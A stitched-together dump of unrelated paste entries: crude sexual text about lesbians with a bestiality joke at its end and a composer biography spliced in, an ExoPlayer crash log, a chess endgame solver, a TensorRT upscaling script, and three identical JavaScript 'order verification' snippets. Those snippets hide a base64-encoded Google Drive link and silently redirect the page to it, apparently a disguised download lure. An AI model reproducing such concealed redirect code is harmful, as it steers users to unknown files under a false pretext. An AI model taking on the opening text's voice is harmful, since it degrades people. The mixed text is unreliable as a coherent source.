‎a‎s‎s‎h‎o‎l‎e‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎ ‎f‎i‎n‎d‎.‎ ‎A‎s‎ ‎a‎n‎y‎o‎n‎e‎ ‎w‎i‎t‎h‎ ‎a‎ ‎p‎e‎n‎i‎s‎ ‎w‎o‎u‎l‎d‎ ‎k‎n‎o‎w‎,‎ ‎i‎t‎'‎s‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎ ‎w‎o‎m‎a‎n‎ ‎i‎n‎t‎o‎ ‎b‎e‎d‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎ ‎w‎h‎e‎n‎ ‎m‎a‎r‎r‎i‎e‎d‎.‎ ‎B‎u‎t‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎w‎o‎ ‎w‎o‎m‎e‎n‎ ‎i‎n‎v‎o‎l‎v‎e‎d‎ ‎w‎i‎t‎h‎ ‎n‎o‎ ‎c‎o‎c‎k‎ ‎p‎e‎s‎t‎e‎r‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎o‎n‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎e‎l‎a‎t‎i‎o‎n‎s‎h‎i‎p‎ ‎w‎h‎o‎ ‎g‎i‎v‎e‎s‎ ‎a‎ ‎s‎h‎i‎t‎ ‎a‎b‎o‎u‎t‎ ‎s‎e‎x‎ ‎a‎n‎y‎m‎o‎r‎e‎,‎ ‎t‎h‎e‎r‎e‎f‎o‎r‎e‎ ‎c‎a‎u‎s‎i‎n‎g‎ ‎l‎e‎s‎b‎i‎a‎n‎ ‎b‎e‎d‎ ‎d‎e‎a‎t‎h‎.‎

(‎(‎ ‎H‎i‎g‎h‎e‎s‎t‎ ‎R‎a‎t‎e‎ ‎o‎f‎ ‎D‎o‎m‎e‎s‎t‎i‎c‎ ‎A‎b‎u‎s‎e‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎l‎o‎r‎e‎n‎c‎e‎ ‎P‎r‎i‎c‎e‎ ‎(‎A‎p‎r‎i‎l‎ ‎9‎,‎ ‎1‎8‎8‎7‎ ‎–‎ ‎J‎u‎n‎e‎ ‎3‎,‎ ‎1‎9‎5‎3‎)‎ ‎w‎a‎s‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎c‎l‎a‎s‎s‎i‎c‎a‎l‎ ‎c‎o‎m‎p‎o‎s‎e‎r‎ ‎p‎i‎a‎n‎i‎s‎t‎,‎ ‎o‎r‎g‎a‎n‎i‎s‎t‎ ‎a‎n‎d‎ ‎m‎u‎s‎i‎c‎ ‎t‎e‎a‎c‎h‎e‎r‎.‎ ‎B‎o‎r‎n‎ ‎i‎n‎ ‎L‎i‎t‎t‎l‎e‎ ‎R‎o‎c‎k‎,‎ ‎A‎r‎k‎a‎n‎s‎a‎s‎,‎ ‎s‎h‎e‎ ‎w‎a‎s‎ ‎e‎d‎u‎c‎a‎t‎e‎d‎ ‎a‎t‎ ‎t‎h‎e‎ ‎N‎e‎w‎ ‎E‎n‎g‎l‎a‎n‎d‎ ‎C‎o‎n‎s‎e‎r‎v‎a‎t‎o‎r‎y‎ ‎o‎f‎ ‎M‎u‎s‎i‎c‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎a‎c‎t‎i‎v‎e‎ ‎i‎n‎ ‎C‎h‎i‎c‎a‎g‎o‎ ‎f‎r‎o‎m‎ ‎1‎9‎2‎7‎ ‎u‎n‎t‎i‎l‎ ‎h‎e‎r‎ ‎d‎e‎a‎t‎h‎.‎ ‎P‎r‎i‎c‎e‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎A‎f‎r‎i‎c‎a‎n‎-‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎w‎o‎m‎a‎n‎ ‎t‎o‎ ‎b‎e‎ ‎r‎e‎c‎o‎g‎n‎i‎z‎e‎d‎ ‎a‎s‎ ‎a‎ ‎s‎y‎m‎p‎h‎o‎n‎i‎c‎ ‎c‎o‎m‎p‎o‎s‎e‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎c‎o‎m‎p‎o‎s‎i‎t‎i‎o‎n‎ ‎p‎l‎a‎y‎e‎d‎ ‎b‎y‎ ‎a‎ ‎m‎a‎j‎o‎r‎ ‎o‎r‎c‎h‎e‎s‎t‎r‎a‎.‎ ‎S‎h‎e‎ ‎c‎o‎m‎p‎o‎s‎e‎d‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎3‎0‎0‎ ‎w‎o‎r‎k‎s‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎f‎o‎u‎r‎ ‎s‎y‎m‎p‎h‎o‎n‎i‎e‎s‎,‎ ‎f‎o‎u‎r‎ ‎c‎o‎n‎c‎e‎r‎t‎o‎s‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎c‎h‎o‎r‎a‎l‎ ‎w‎o‎r‎k‎s‎,‎ ‎a‎r‎t‎ ‎s‎o‎n‎g‎s‎,‎ ‎c‎h‎a‎m‎b‎e‎r‎ ‎m‎u‎s‎i‎c‎,‎ ‎a‎n‎d‎ ‎m‎u‎s‎i‎c‎ ‎f‎o‎r‎ ‎s‎o‎l‎o‎ ‎i‎n‎s‎t‎r‎u‎m‎e‎n‎t‎s‎.‎ ‎T‎h‎i‎s‎ ‎p‎o‎r‎t‎r‎a‎i‎t‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎P‎r‎i‎c‎e‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎9‎4‎0‎ ‎b‎y‎ ‎G‎e‎o‎r‎g‎e‎ ‎N‎e‎l‎i‎d‎o‎f‎f‎ ‎a‎n‎d‎ ‎i‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎o‎l‎l‎e‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎o‎f‎ ‎A‎r‎k‎a‎n‎s‎a‎s‎ ‎L‎i‎b‎r‎a‎r‎i‎e‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎G‎e‎o‎r‎g‎e‎ ‎N‎e‎l‎i‎d‎o‎f‎f‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎M‎y‎C‎a‎t‎I‎s‎A‎C‎h‎o‎n‎k‎

.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎f‎u‎c‎k‎ ‎m‎y‎ ‎p‎u‎p‎p‎y‎.‎"
XnuqaszU,Products.js,zebmekey,JavaScript,Wednesday 9th of April 2025 01:46:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z5r4ECrT,2025-04-09T23:33:48.243770,powerampache,PHP,Wednesday 9th of April 2025 01:33:49 PM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":18},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":191716026,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d26d317b937b3df57e6ddec7bccbf39a7\u0026type\u003dsong\u0026id\u003d7127"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
CcvSXj8S,Order.js,zebmekey,JavaScript,Wednesday 9th of April 2025 01:31:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tysPwR3x,excellent,max2201111,Python,Wednesday 9th of April 2025 01:16:55 PM CDT,"MATE_SCORE = 10000
INF = 10000000

# Parse FEN string into board matrix and side to move
def parse_fen(fen_str):
    parts = fen_str.split()
    rows = parts[0].split('/')
    side_to_move = parts[1]
    board = []
    for rank in rows:
        row = []
        for ch in rank:
            if ch.isdigit():
                row.extend(['.'] * int(ch))
            else:
                row.append(ch)
        board.append(row)
    # Ensure 8 columns per rank
    for i in range(len(board)):
        if len(board[i]) < 8:
            board[i].extend(['.'] * (8 - len(board[i])))
    # Ensure 8 ranks
    while len(board) < 8:
        board.append(['.'] * 8)
    return board, side_to_move

# Directions for moves of each piece type
king_dirs   = [(-1,-1), (-1,0), (-1,1), (0,-1), (0,1), (1,-1), (1,0), (1,1)]
rook_dirs   = [(-1,0), (1,0), (0,-1), (0,1)]
bishop_dirs = [(-1,-1), (-1,1), (1,-1), (1,1)]
knight_moves = [(-2,-1), (-2,1), (-1,-2), (-1,2), (1,-2), (1,2), (2,-1), (2,1)]

# Generate all pseudo-legal moves (not filtering self-check yet) for the given side
def generate_pseudo_legal_moves(board, side):
    moves = []
    # Find opponent king position (to avoid moving king adjacent to it)
    opp_king_char = 'K' if side == 'b' else 'k'
    opp_king_pos = None
    for r in range(8):
        for c in range(8):
            if board[r][c] == opp_king_char:
                opp_king_pos = (r, c)
                break
        if opp_king_pos: break
    for r in range(8):
        for c in range(8):
            piece = board[r][c]
            if piece == '.':
                continue
            # Skip pieces of the opposite side
            if side == 'w' and not piece.isupper():
                continue
            if side == 'b' and not piece.islower():
                continue
            p = piece.lower()
            if p == 'k':  # King moves
                for dr, dc in king_dirs:
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < 8 and 0 <= nc < 8:
                        dest = board[nr][nc]
                        # Cannot move onto own piece
                        if side == 'w' and dest.isupper(): 
                            continue
                        if side == 'b' and dest.islower():
                            continue
                        # Cannot move adjacent to opponent king
                        if opp_king_pos and abs(opp_king_pos[0] - nr) <= 1 and abs(opp_king_pos[1] - nc) <= 1:
                            continue
                        moves.append((r, c, nr, nc))
            elif p in ('r', 'b', 'q'):  # Rook, Bishop, Queen moves (sliding pieces)
                dirs = []
                if p == 'r':
                    dirs = rook_dirs
                elif p == 'b':
                    dirs = bishop_dirs
                elif p == 'q':
                    dirs = rook_dirs + bishop_dirs
                for dr, dc in dirs:
                    nr, nc = r + dr, c + dc
                    while 0 <= nr < 8 and 0 <= nc < 8:
                        dest = board[nr][nc]
                        if side == 'w' and dest.isupper():
                            break
                        if side == 'b' and dest.islower():
                            break
                        # Stop if hitting any king (cannot capture king, treat as block)
                        if dest.lower() == 'k':
                            break
                        moves.append((r, c, nr, nc))
                        # Stop if we captured an opponent piece (can't go further)
                        if dest != '.':
                            break
                        nr += dr
                        nc += dc
            elif p == 'n':  # Knight moves
                for dr, dc in knight_moves:
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < 8 and 0 <= nc < 8:
                        dest = board[nr][nc]
                        if side == 'w' and dest.isupper():
                            continue
                        if side == 'b' and dest.islower():
                            continue
                        if dest.lower() == 'k':  # cannot capture king
                            continue
                        moves.append((r, c, nr, nc))
            elif p == 'p':  # Pawn moves (just in case, though default FEN has none)
                if side == 'w':
                    # one step forward
                    if r-1 >= 0 and board[r-1][c] == '.':
                        moves.append((r, c, r-1, c))
                        # two steps from starting rank 2
                        if r == 6 and board[5][c] == '.':
                            moves.append((r, c, 4, c))
                    # captures
                    for dc in (-1, 1):
                        nr, nc = r-1, c+dc
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            if board[nr][nc] != '.' and board[nr][nc].islower():
                                if board[nr][nc].lower() != 'k':  # not capturing king
                                    moves.append((r, c, nr, nc))
                else:  # side == 'b'
                    if r+1 < 8 and board[r+1][c] == '.':
                        moves.append((r, c, r+1, c))
                        if r == 1 and board[2][c] == '.':
                            moves.append((r, c, 3, c))
                    for dc in (-1, 1):
                        nr, nc = r+1, c+dc
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            if board[nr][nc] != '.' and board[nr][nc].isupper():
                                if board[nr][nc].lower() != 'k':
                                    moves.append((r, c, nr, nc))
    return moves

# Check if the king of the given side is in check
def is_in_check(board, side):
    king_char = 'K' if side == 'w' else 'k'
    kr = kc = None
    # Find this side's king
    for r in range(8):
        for c in range(8):
            if board[r][c] == king_char:
                kr, kc = r, c
                break
        if kr is not None:
            break
    if kr is None:
        # King not found (should not happen in normal play)
        return True
    opp_side = 'b' if side == 'w' else 'w'
    # Opponent king (to check adjacency threat)
    opp_king_char = 'K' if opp_side == 'w' else 'k'
    opp_kr = opp_kc = None
    for r in range(8):
        for c in range(8):
            if board[r][c] == opp_king_char:
                opp_kr, opp_kc = r, c
                break
        if opp_kr is not None:
            break
    if opp_kr is not None:
        if abs(opp_kr - kr) <= 1 and abs(opp_kc - kc) <= 1:
            return True  # adjacent enemy king (illegal position)
    # Knights
    for dr, dc in knight_moves:
        rr, cc = kr+dr, kc+dc
        if 0 <= rr < 8 and 0 <= cc < 8:
            piece = board[rr][cc]
            if piece.lower() == 'n':
                # If an opponent knight is at (rr,cc)
                if opp_side == 'w' and piece.isupper():
                    return True
                if opp_side == 'b' and piece.islower():
                    return True
    # Pawns
    if opp_side == 'w':
        # White pawn attacks downwards (from its perspective)
        attack_deltas = [(kr+1, kc-1), (kr+1, kc+1)]
        for (pr, pc) in attack_deltas:
            if 0 <= pr < 8 and 0 <= pc < 8 and board[pr][pc] == 'P':
                return True
    else:
        # Black pawn attacks upwards
        attack_deltas = [(kr-1, kc-1), (kr-1, kc+1)]
        for (pr, pc) in attack_deltas:
            if 0 <= pr < 8 and 0 <= pc < 8 and board[pr][pc] == 'p':
                return True
    # Rooks, bishops, queens
    directions = rook_dirs + bishop_dirs
    for dr, dc in directions:
        rr, cc = kr + dr, kc + dc
        while 0 <= rr < 8 and 0 <= cc < 8:
            piece = board[rr][cc]
            if piece != '.':
                if opp_side == 'w' and piece.isupper():
                    # opponent (white) piece
                    if dr == 0 or dc == 0:  # along rank/file
                        if piece.lower() in ('r', 'q'):
                            return True
                    else:  # diagonal
                        if piece.lower() in ('b', 'q'):
                            return True
                if opp_side == 'b' and piece.islower():
                    if dr == 0 or dc == 0:
                        if piece.lower() in ('r', 'q'):
                            return True
                    else:
                        if piece.lower() in ('b', 'q'):
                            return True
                break  # stop at first piece encountered
            rr += dr
            cc += dc
    return False

# Move ordering priority function (helps the search prune faster)
def move_priority(board, move, side):
    fr, fc, tr, tc = move
    piece = board[fr][fc]
    target = board[tr][tc]
    if side == 'b':
        # Black (the mating side in default position) prioritizes moves:
        # 1. Avoid moves that place the rook next to the enemy king unprotected (risk immediate capture)
        if piece.lower() == 'r':
            # Check if rook's destination is adjacent to white king
            wk_r = wk_c = None
            for r in range(8):
                for c in range(8):
                    if board[r][c] == 'K':
                        wk_r, wk_c = r, c
                        break
                if wk_r is not None:
                    break
            if wk_r is not None and abs(wk_r - tr) <= 1 and abs(wk_c - tc) <= 1:
                # Rook moves adjacent to white king
                # Check if black's own king is *not* also adjacent to that square (meaning rook would be unprotected)
                bk_r = bk_c = None
                for r in range(8):
                    for c in range(8):
                        if board[r][c] == 'k':
                            bk_r, bk_c = r, c
                            break
                    if bk_r is not None:
                        break
                if not (bk_r is not None and abs(bk_r - tr) <= 1 and abs(bk_c - tc) <= 1):
                    return 5  # low priority (likely bad move)
        # 2. Capturing any opponent piece (if any existed) is good
        if target != '.' and target.isupper():
            return 0
        # 3. Moves by high-value pieces (rook/queen) first
        if piece.lower() in ('r', 'q'):
            return 1
        # 4. King moves last
        if piece.lower() == 'k':
            return 3
        return 2
    else:
        # White (defending side) prioritizes moves:
        # 1. Capture the opponent's rook if possible (to force draw)
        if target != '.' and target.islower():
            if target.lower() in ('r', 'q'):
                return 0
            else:
                return 1
        # 2. Other moves considered equal
        return 2

# Cache for transposition table: maps (state, depth) -> (score, best_line)
cache = {}

# Negamax search with alpha-beta pruning and iterative deepening
def negamax(board, side, depth, alpha, beta, visited, ply):
    state_key = (side, tuple(tuple(row) for row in board))
    # Transposition table lookup
    if (state_key, depth) in cache:
        return cache[(state_key, depth)]
    # Prevent cycles (threefold repetition or perpetual chasing)
    if state_key in visited:
        return 0, []
    if depth == 0:
        # Horizon reached, no static eval -> assume draw (0)
        return 0, []
    # Generate moves and filter legal moves (those not leaving own king in check)
    moves = generate_pseudo_legal_moves(board, side)
    legal_moves = []
    for move in moves:
        fr, fc, tr, tc = move
        piece = board[fr][fc]
        captured = board[tr][tc]
        # Make the move
        board[fr][fc] = '.'
        board[tr][tc] = piece
        if not is_in_check(board, side):
            legal_moves.append(move)
        # Undo move
        board[fr][fc] = piece
        board[tr][tc] = captured
    if not legal_moves:
        # No moves: check terminal condition
        if is_in_check(board, side):
            # Checkmate: current side has no moves and is in check -> losing
            return -(MATE_SCORE - ply), []
        else:
            # Stalemate
            return 0, []
    # Order moves to improve pruning
    legal_moves.sort(key=lambda m: move_priority(board, m, side))
    visited.add(state_key)
    best_score = -INF
    best_line = []
    next_side = 'w' if side == 'b' else 'b'
    for move in legal_moves:
        fr, fc, tr, tc = move
        piece = board[fr][fc]
        captured = board[tr][tc]
        # Apply move
        board[fr][fc] = '.'
        board[tr][tc] = piece
        score, line = negamax(board, next_side, depth-1, -beta, -alpha, visited, ply+1)
        score = -score
        # Undo move
        board[fr][fc] = piece
        board[tr][tc] = captured
        if score > best_score:
            best_score = score
            best_line = [move] + line
        alpha = max(alpha, best_score)
        if alpha >= beta:
            # Alpha-beta cutoff
            break
    visited.remove(state_key)
    # Distance-to-mate scoring: ensure shorter mate is better
    cache[(state_key, depth)] = (best_score, best_line.copy())
    return best_score, best_line

# Print board in ASCII
def print_board(board):
    for r in range(8):
        print("" "".join(board[r]))

# Main execution
if __name__ == ""__main__"":
    # Starting FEN: K+R vs K endgame position
    start_fen = ""8/1K2k3/r7/8/8/8/8/8 b - - 0 1""
    board, side = parse_fen(start_fen)
    final_score = None
    final_line = []
    # Iterative deepening search
    for depth in range(1, 51):
        score, line = negamax(board, side, depth, -INF, INF, set(), 0)
        final_score = score
        final_line = line
        # Prepare score display
        if abs(score) >= MATE_SCORE - 100:
            # If score indicates a checkmate sequence
            mate_dist = MATE_SCORE - abs(score)
            if score > 0:
                score_str = f""Mate in {mate_dist} half-moves""
            elif score < 0:
                score_str = f""-Mate in {mate_dist} half-moves""
            else:
                score_str = ""Mate""
        else:
            score_str = str(score)
        # Prepare principal variation moves display
        pv_moves = []
        for (fr, fc, tr, tc) in line:
            pv_moves.append(chr(ord('a') + fc) + str(8 - fr) + chr(ord('a') + tc) + str(8 - tr))
        print(f""Depth {depth}: Score = {score_str}, PV = {' '.join(pv_moves)}"")
        if abs(score) > 9000 or score == MATE_SCORE or score == -MATE_SCORE:
            # Stop when a checkmate is found
            break
    # Execute the best sequence of moves found
    print(""\nExecuting best sequence:"")
    print_board(board)
    print(f""Side to move: {'White' if side == 'w' else 'Black'}"")
    current_side = side
    for (fr, fc, tr, tc) in final_line:
        piece = board[fr][fc]
        board[fr][fc] = '.'
        board[tr][tc] = piece
        current_side = 'w' if current_side == 'b' else 'b'
        print()  # blank line between moves
        print_board(board)
        print(f""Side to move: {'White' if current_side == 'w' else 'Black'}"")
"
PSMhbX60,Market.js,zebmekey,JavaScript,Wednesday 9th of April 2025 01:16:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92531/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4hzFVtBn,Tensorrt Batch Upscaling script,zelenooki87,Python,Wednesday 9th of April 2025 01:16:06 PM CDT,"# --- START OF FILE batch_trt_esc_GRAIN_ALPHA_en_comments.py ---

import numpy as np
import tensorrt as trt
import pycuda.driver as cuda
import pycuda.autoinit # Automatically manages CUDA context
from PIL import Image, ImageFile
import cv2 # Needed for resize in process_image and potentially for grain if we keep cvtColor
import os
import time
from pathlib import Path
import rawpy
# import pyheif # Commented out
import concurrent.futures
import argparse
from tqdm.auto import tqdm
import sys
import traceback

# Enable loading of truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# --- load_image function remains the same ---
def load_image(image_path: Path):
    """"""Loads an image of various formats including RAW and HEIC using a Path object.""""""
    ext = image_path.suffix.lower()
    try:
        # if ext in ['.heic', '.heif']:
        #     try: import pyheif
        #     except ImportError: print(""Warning: pyheif is not installed.""); return None
        #     heif_file = pyheif.read(image_path)
        #     img = Image.frombytes(heif_file.mode, heif_file.size, heif_file.data, ""raw"", heif_file.mode, heif_file.stride)
        #     if img.mode == 'RGBA': img = img.convert('RGB')
        #     return np.array(img)
        if ext in ['.arw', '.cr2', '.nef', '.dng', '.raf', '.raw']:
            with rawpy.imread(str(image_path)) as raw:
                # Use postprocess to get uint8 RGB image
                img = raw.postprocess(use_camera_wb=True, output_bps=8, no_auto_bright=True) # Added no_auto_bright
                if img is None: raise IOError(""rawpy failed to process the image."")
                return img
        else:
            img = Image.open(image_path)
            # Ensure the image is converted to RGB before returning the array
            if img.mode == 'P': # Palette
                 img = img.convert('RGBA').convert('RGB') # Via RGBA for better palette conversion
